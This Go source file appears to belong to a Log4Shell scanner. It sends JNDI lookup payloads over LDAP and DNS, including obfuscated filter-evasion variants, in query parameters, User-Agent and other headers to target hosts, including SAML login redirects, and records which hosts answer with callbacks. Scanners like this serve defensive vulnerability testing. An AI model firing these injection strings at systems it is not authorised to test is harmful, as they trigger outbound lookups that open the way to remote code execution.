package cmd

import (
	"crypto/tls"
	"fmt"
	"net"
	"net/http"
	// "net/http/httputil"
	"net/url"
	"sync"
	"time"
        "strings"

	"github.com/pterm/pterm"
	log "github.com/sirupsen/logrus"
)

func ScanIP(hostUrl string, serverUrlLDAP string, serverUrlDNS string, reqType string, wg *sync.WaitGroup, resChan chan string) {
        defer wg.Done()
        const timeoutInterval = 2

        client := &http.Client{
                Timeout: 2 * timeoutInterval * time.Second,
                Transport: &http.Transport{
                        TLSHandshakeTimeout:   10 * timeoutInterval * time.Second,
                        ResponseHeaderTimeout: timeoutInterval * time.Second,
                        ExpectContinueTimeout: timeoutInterval * time.Second,
                        TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
                },
        }

        log.Debugf("Target URL: %s", hostUrl)
        // fmt.Println(LDAPServer.sChan)
        var LDAPpayloads = []string{
                "${jndi:ldap://",
                "${${::-j}ndi:ldap://",
                "${${lower:jndi}:${lower:ldap}://",
                "${${lower:${lower:jndi}}:${lower:ldap}://",
                "${${lower:j}${lower:n}${lower:d}i:${lower:ldap}://",
                "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://",
                "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:l}d${lower:a}${lower:p}}://",
        }

        var DNSpayloads = []string{
                "${jndi:dns://",
                "${${::-j}ndi:dns://",
                "${${lower:jndi}:${lower:dns}://",
                "${${lower:${lower:jndi}}:${lower:dns}://",
                "${${lower:j}${lower:n}${lower:d}i:${lower:dns}://",
                "${${::-j}${::-n}${::-d}${::-i}:${::-d}${::-n}${::-s}://",
                "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:d}n${lower:s}}://",
        }
        if reqType == "LDAP" {
                if strings.Contains(hostUrl, "ui/login") {
                client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
                return http.ErrUseLastResponse
                }
                        for _, LDAPpayload := range LDAPpayloads {

                                baseUrl, err := url.Parse(hostUrl)
                                targetUrl := baseUrl.String()
                                request, err := http.NewRequest("GET", targetUrl, nil)
                                if err != nil {
                                        pterm.Error.Println(err)
                                        log.Fatal(err)
                                }
                                response, _ := client.Do(request)
                                if response != nil {
                                        redirectUrl := response.Header.Get("location")
                                        if len(redirectUrl) > 0  {
                                                newUrl, _ := url.Parse(redirectUrl)
                                                newTargetUrl := newUrl.Scheme + "://" + newUrl.Host + newUrl.Path + "?" + "SAMLRequest="
                                                traceHint := fmt.Sprintf("%s_%s", baseUrl.Hostname(), baseUrl.Port())
                                                targetUserAgent := LDAPpayload + serverUrlLDAP + "/" + traceHint + "_User-Agent" + "}"
                                                targetHeader := LDAPpayload + serverUrlLDAP + "/" + traceHint + "}"
                                                newRequest, err := http.NewRequest("GET", newTargetUrl, nil)
                                                newRequest.Header.Set("User-Agent", targetUserAgent)
                                                addCommonHeadersLDAP(&newRequest.Header,targetHeader)
                                                newResponse, err := client.Do(newRequest)
                                                if err != nil && !strings.Contains(err.Error(), "Client.Timeout") {
                                                        log.Debug(err)
                                                }
                                                if newResponse != nil {
                                                        url := strings.Split(hostUrl, ":")
                                                        if len(url) != 3 {
                                                                log.Fatal("Error in response hostUrl parsing:", url)
                                                        }
                                                        msg := fmt.Sprintf("request,%s,%s,%d", strings.Replace(url[1], "/", "", -1), url[2], newResponse.StatusCode)
                                                        updateCsvRecords(msg)
                                                        resChan <- msg
                                                        log.Infof(msg)
                                                }
                                        }
                                }
                        }
                } else {
                        for _, LDAPpayload := range LDAPpayloads {

                                baseUrl, err := url.Parse(hostUrl)
                                param := url.Values{}
                                traceHint := fmt.Sprintf("%s_%s", baseUrl.Hostname(), baseUrl.Port())
                                param.Add("x", LDAPpayload + serverUrlLDAP + "/" + traceHint + "}")
                                baseUrl.RawQuery = param.Encode()
                                targetUrl := baseUrl.String()
                                targetUserAgent := LDAPpayload + serverUrlLDAP + "/" + traceHint + "_User-Agent" + "}"
                                targetHeader := LDAPpayload + serverUrlLDAP + "/" + traceHint + "}"
                                request, err := http.NewRequest("GET", targetUrl, nil)
                                if err != nil {
                                        pterm.Error.Println(err)
                                        log.Fatal(err)
                                }
                                request.Header.Set("User-Agent", targetUserAgent)
                                addCommonHeadersLDAP(&request.Header,targetHeader)
                                response, err := client.Do(request)
                                if err != nil && !strings.Contains(err.Error(), "Client.Timeout") {
                                        log.Debug(err)
                                }
                                if response != nil {
                                        url := strings.Split(hostUrl, ":")
                                        if len(url) != 3 {
                                                log.Fatal("Error in response hostUrl parsing:", url)
                                        }
                                        msg := fmt.Sprintf("request,%s,%s,%d", strings.Replace(url[1], "/", "", -1), url[2], response.StatusCode)
                                        updateCsvRecords(msg)
                                        resChan <- msg
                                        log.Infof(msg)
                                }
                        }
                }
        }

        if reqType == "DNS" {
                if strings.Contains(hostUrl, "ui/login") {
                client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
                return http.ErrUseLastResponse
                }
                        for _, DNSpayload := range DNSpayloads {

                                baseUrl, _ := url.Parse(hostUrl)
                                targetUrl := baseUrl.String()
                                request, err := http.NewRequest("GET", targetUrl, nil)
                                request.Close = true
                                if err != nil {
                                        pterm.Error.Println(err)
                                        log.Fatal(err)
                                }
                                response, _ := client.Do(request)
                                if response != nil {
                                        redirectUrl := response.Header.Get("location")
                                        if len(redirectUrl) > 0  {
                                                newUrl, _ := url.Parse(redirectUrl)
                                                newTargetUrl := newUrl.Scheme + "://" + newUrl.Host + newUrl.Path + "?" + "SAMLRequest="
                                                targetUserAgent := DNSpayload + serverUrlDNS + "}"
                                                targetHeader := DNSpayload + serverUrlDNS + "}"
                                                newRequest, err := http.NewRequest("GET", newTargetUrl, nil)
                                                newRequest.Header.Set("User-Agent", targetUserAgent)
                                                addCommonHeadersDNS(&newRequest.Header,targetHeader)
                                                newResponse, err := client.Do(newRequest)
                                                if err != nil && !strings.Contains(err.Error(), "Client.Timeout") {
                                                        log.Debug(err)
                                                }
                                                if newResponse != nil {
                                                        url := strings.Split(hostUrl, ":")
                                                        if len(url) != 3 {
                                                                log.Fatal("Error in response hostUrl parsing:", url)
                                                        }
                                                        msg := fmt.Sprintf("request,%s,%s,%d", strings.Replace(url[1], "/", "", -1), url[2], newResponse.StatusCode)
                                                        updateCsvRecords(msg)
                                                        resChan <- msg
                                                        log.Infof(msg)
                                                }
                                        }
                                }
                        }
                } else {
                        for _, DNSpayload := range DNSpayloads {

                                baseUrl, err := url.Parse(hostUrl)
                                param := url.Values{}
                                param.Add("x", DNSpayload + serverUrlDNS + "}")
                                baseUrl.RawQuery = param.Encode()
                                targetUrl := baseUrl.String()
                                targetUserAgent := DNSpayload + serverUrlDNS + "}"
                                targetHeader := DNSpayload + serverUrlDNS + "}"
                                request, err := http.NewRequest("GET", targetUrl, nil)
                                if err != nil {
                                        pterm.Error.Println(err)
                                        log.Fatal(err)
                                }
                                request.Header.Set("User-Agent", targetUserAgent)
                                addCommonHeadersDNS(&request.Header,targetHeader)
                                response, err := client.Do(request)
                                if err != nil && !strings.Contains(err.Error(), "Client.Timeout") {
                                        log.Debug(err)
                                }
                                if response != nil {
                                        url := strings.Split(hostUrl, ":")
                                        if len(url) != 3 {
                                                log.Fatal("Error in response hostUrl parsing:", url)
                                        }
                                        msg := fmt.Sprintf("request,%s,%s,%d", strings.Replace(url[1], "/", "", -1), url[2], response.StatusCode)
                                        updateCsvRecords(msg)
                                        resChan <- msg
                                        log.Infof(msg)
                                }
                        }
                }
        }

}

// GetLocalIP returns the non loopback local IP of the host
func GetLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}
	for _, address := range addrs {
		// check the address type and if it is not a loopback the display it
		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return ""
}
